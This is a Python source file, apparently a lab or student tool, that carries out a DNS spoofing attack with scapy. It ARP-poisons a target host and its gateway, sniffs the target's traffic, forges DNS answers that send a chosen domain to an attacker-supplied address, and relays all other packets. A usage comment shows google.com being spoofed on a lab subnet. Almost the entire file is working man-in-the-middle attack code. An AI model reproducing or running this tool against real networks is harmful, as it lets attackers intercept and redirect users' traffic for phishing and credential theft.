from scapy.all import *
from arp_spoofing import * 


dns_server_ip = ""
dns_server_mac = ""
spoofed_addr = ""
iface = ""
spoofed_dom={}
sock = 0
host_ip_addr = ""
host_mac_addr = ""


def get_gateway():
    gws=conf.route.route("0.0.0.0")[2]

    global dns_server_ip
    dns_server_ip = gws
    global dns_server_mac
    dns_server_mac = getmacbyip(gws)

    print("Gateway: " +  dns_server_ip + " " + dns_server_mac)


def dns_spoof(pkt, ip_of_dns):
    spoofed_pkt=pkt.copy()
    qname=pkt[DNSQR].qname

    spoofed_pkt[Ether].src = pkt[Ether].dst
    spoofed_pkt[Ether].dst = pkt[Ether].src
    spoofed_pkt[IP].src = str(pkt[IP].dst)
    spoofed_pkt[IP].dst = str(pkt[IP].src)
    spoofed_pkt[DNS].an = DNSRR(rrname=qname, rdata=ip_of_dns, ttl=300)
    spoofed_pkt[DNS].ancount = 1
    spoofed_pkt[DNS].qr = 1
    spoofed_pkt[DNS].aa = 1
    spoofed_pkt[DNS].ra = 1
    spoofed_pkt[UDP].sport = pkt[UDP].dport
    spoofed_pkt[UDP].dport = pkt[UDP].sport

    del spoofed_pkt[IP].len
    del spoofed_pkt[IP].chksum
    del spoofed_pkt[UDP].len
    del spoofed_pkt[UDP].chksum

    sock.send(spoofed_pkt)


def fwd_pkt(pkt):
    pkt[Ether].dst=dns_server_mac

    if pkt.haslayer(IP):
        del pkt[IP].len
        del pkt[IP].chksum

    if pkt.haslayer(UDP):
        del pkt[UDP].len
        del pkt[UDP].chksum

    sock.send(pkt)


def dns_pkt_check(pkt):
    if pkt.haslayer(DNS) and spoofed_dom.has_key(pkt[DNSQR].qname):
        dns_spoof(pkt, spoofed_addr)
    else:
        fwd_pkt(pkt)


def arp_for_dns_spoof_loop(ip, mac, spoofed_ip):
    print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
    i = 0
    while i in range(10):
        arp_spoof(ip, mac, spoofed_ip)
        time.sleep(1)
        i+=1
    print("ARP Poison to %s complete" % ip)


def start_dns_poison(cmd):
    args = shlex.split(cmd)
    tgtip = spoofed_addr = dom = None
    for i, arg in enumerate(args):
        if arg == "-iface" and i + 1 < len(args):
            global iface
            iface = args[i + 1]
        elif arg == "-tgtip" and i + 1 < len(args):
            tgtip = args[i + 1]
        elif arg == "-dom" and i + 1 < len(args):
            dom = args[i + 1]
            global spoofed_dom
            spoofed_dom[dom + "."] = host_ip_addr
        elif arg == "-spaddr" and i + 1 < len(args):
            global spoofed_addr
            spoofed_addr = args[i + 1]

    if not iface or not tgtip or not dom or not spoofed_addr:
        print("[!] Usage: dnspoison -iface <iface> -tgtip <target_ip> -dom <domain> -spaddr <spoofed_address>")
        return

    global sock
    sock = conf.L2socket(iface=iface)
    global host_ip_addr
    host_ip_addr = get_if_addr(iface)
    global host_mac_addr
    host_mac_addr = get_if_hwaddr(iface)

    get_gateway()

    arp_thread_gws = threading.Thread(target=arp_for_dns_spoof_loop, args=(dns_server_ip, host_mac_addr, tgtip))
    arp_thread_gws.daemon = True
    arp_thread_gws.start()

    arp_thread_tgt = threading.Thread(target=arp_for_dns_spoof_loop, args=(tgtip, host_mac_addr, dns_server_ip))
    arp_thread_tgt.daemon = True
    arp_thread_tgt.start()

    sniff(store = 0, filter="src host " + str(tgtip), iface = iface, prn = lambda x: dns_pkt_check(x))


#dnspoison -iface enp0s9 -tgtip 10.0.2.4 -dom google.com -spaddr 10.0.2.5 




